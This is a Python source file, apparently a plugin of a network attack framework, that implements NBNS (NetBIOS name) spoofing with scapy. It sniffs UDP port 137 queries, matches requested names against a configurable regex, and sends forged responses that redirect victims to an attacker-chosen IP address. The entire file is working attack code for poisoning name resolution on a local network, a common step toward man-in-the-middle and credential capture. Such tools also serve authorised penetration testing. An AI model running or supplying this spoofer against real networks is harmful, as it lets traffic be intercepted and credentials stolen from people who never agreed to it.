import re
from threading import Thread
from scapy.all import *
from zoption import Zoption
from poison import Poison
import util
import config


class nbns(Poison):
    def __init__(self):
        super(nbns, self).__init__('NBNS Poison')
        conf.verb = 0
        self.local_mac = get_if_hwaddr(config.get('iface'))
        self.config.update({"regex_match":Zoption(type = "regex", 
                                           value = None,
                                           required = True, 
                                           display = "Match request regex"),
                            "redirect":Zoption(type = "ip", 
                                        value = None,
                                        required = True, 
                                        display = "Redirect to")
                           })
        self.info = """
                    Implements NBNS spoofing.
                    Requests are matched based on Python's regex parser.
                    """

    def handler(self, pkt):
        """Callback for packets"""
        if pkt.haslayer(NBNSQueryRequest):
            request = pkt[NBNSQueryRequest].getfieldval('QUESTION_NAME')
            ret = self.config['regex_match'].value.search(request.lower())
            if ret is None:
                return

            if not ret.group(0) is None and pkt[Ether].dst != self.local_mac \
                      and pkt[IP].src != util.get_local_ip(config.get('iface')):
                trans_id = pkt[NBNSQueryRequest].getfieldval('NAME_TRN_ID')
                response = Ether(dst=pkt[Ether].src, src=self.local_mac)
                response /= IP(dst=pkt[IP].src) / UDP(sport=137, dport=137)
                response /= NBNSQueryResponse(NAME_TRN_ID=trans_id,
                  RR_NAME=request, NB_ADDRESS=self.config['redirect'].value)
                del response[UDP].chksum  # recalc checksum
                sendp(response)    # layer 2 send for performance
                self.log_msg('Spoofing \'%s\' from %s'
                                        % (request.strip(), pkt[IP].src))

    def initialize(self):
        """Initialize spoofer
        """
        util.Msg('[!] Starting NBNS spoofer...')
        sniffr = Thread(target=self.sniff_thread)
        sniffr.start()
        self.running = True
        return True

    def sniff_thread(self):
        """Sniff packets"""
        sniff(filter='udp and port 137', prn=self.handler, store=0,
                                stopper=self.test_stop, stopperTimeout=3)

    def shutdown(self):
        """Shutdown sniffer"""
        util.Msg("Shutting down NBNS spoofer...")
        if self.running:
            self.running = False
        return True

    def session_view(self):
        """Override session viewer"""
        return '%s -> %s' % (self.config['regex_match'].getStr(),
                self.config['redirect'].value)
